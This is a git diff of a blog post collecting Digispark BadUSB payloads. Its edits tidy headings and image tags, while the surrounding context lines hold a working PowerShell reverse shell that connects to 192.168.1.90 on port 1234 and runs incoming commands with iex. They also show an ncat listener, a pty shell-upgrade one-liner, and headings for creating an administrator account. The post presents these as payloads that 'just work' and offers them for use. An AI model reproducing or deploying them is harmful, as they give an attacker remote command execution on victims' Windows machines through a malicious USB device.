@@ -22,7 +22,7 @@ excerpt: "Payloads digispark"
 
 ## All the payloads that just works 👍
 
-**Say something on command line ශ**
+**Say something on command line**
 
 # Tell something with command line interface 🎭
 
@@ -56,10 +56,10 @@ void loop() {
 }
 ```
 
-**Create administrator account 𝌒**
-**Reverse shell windows ＼**
+**Create administrator account**
+**Reverse shell windows**
 
-# Reverse shell on windows 🤡
+# Reverse shell on windows
 
 ## First, on the host attacker machine create a php server and upload the payload
 
@@ -74,7 +74,9 @@ $client=New-Object System.Net.Sockets.TCPClient('192.168.1.90',1234);$stream = $
 $sm=(New-Object Net.Sockets.TCPClient('192.168.1.90',1234)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
 ```
 
-![https://i.imgur.com/QMC7DVO.png](https://i.imgur.com/QMC7DVO.png)
+<div className="Image__Small">
+  <img src="https://i.imgur.com/QMC7DVO.png" alt="blog_image" />
+</div>
 
 ```bash
 # Listen all the tcp connexion on port 1234
@@ -84,7 +86,9 @@ ncat -nvlp [PORT]
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e76316ca-186c-47fe-be6c-e5f77dd03b2f/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e76316ca-186c-47fe-be6c-e5f77dd03b2f/Untitled.png)
+<div className="Image__Medium">
+  <img src="https://i.imgur.com/DumRqur.png" alt="blog_image" />
+</div>
 
 ```arduino
 #include "DigiKeyboard.h"
@@ -138,7 +142,7 @@ void loop() {
 
 ## Useful commands
 
-**Windows commands ̐**
+**Windows commands**
 
 # **CMD - Windows commands**
 
